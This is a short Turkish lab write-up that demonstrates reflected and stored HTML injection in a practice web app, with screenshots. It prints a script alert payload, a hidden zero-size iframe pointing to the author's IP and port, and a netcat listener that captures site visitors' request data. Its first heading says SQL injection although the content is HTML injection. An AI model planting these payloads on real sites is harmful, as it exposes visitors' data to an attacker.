SQL İNJECTİON - REFLECTED (GET)

![photo_6023604428080265317](https://user-images.githubusercontent.com/110966683/183882924-70f82c7d-2eda-466c-9db7-4680c145040d.jpeg)

bu panelde html açığı olup olmadığını anlamak için panele html kodu yazıyoruz ben örnek olarak başlık satırı içinde adımı  yazıyorum.

![photo_6025856227893950465_w](https://user-images.githubusercontent.com/110966683/183883997-b8cb1b5b-2198-4612-ac88-f445d160f5e6.jpeg)

gördüğümüz gibi başlık olarak yazdı 

alert scripti deneyelim şimdi ekrana 1 yazdırması lazım

<h1>Hello,<script>alert(1)</script>!</h1>

![photo_6023604428080265318_w](https://user-images.githubusercontent.com/110966683/183884371-f0fefa5a-4830-465d-8f45-8b239cb8ccf7.jpg)

HTML İNJECTİON - STORED (BLOG)
eğer bir stored açığı olursa burda çalıştırdığımız bir kod web sitesine giren herkesi etkiler farklı bilgisayrdan bu web sitesine girseniz bile hackerin çalıştırdığı kod çalışacaktır.
örnek olarak alert scripti çalıştırırsak giren her kullanıcı bu alerti görür
alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
peki daha teklikeli olarak ne yapılabilir;
<iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
kendi bilgisayarımızın ip sini ve kullanılmayan bir portadresi yazıyoruz 

bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
dinlemek için linux terminalimizde natcat kullanacağız 
linux natcat komutu: nc -nvlp 4545 dinlemek için 


![photo_6023604428080265325_w](https://user-images.githubusercontent.com/110966683/183884730-c7d1a93e-aefe-488d-938b-738bfcd1d907.jpg)


görüldüğü gibi belirlediğimizportu dinledi ve kullanıcının bilgilerini getirdi.
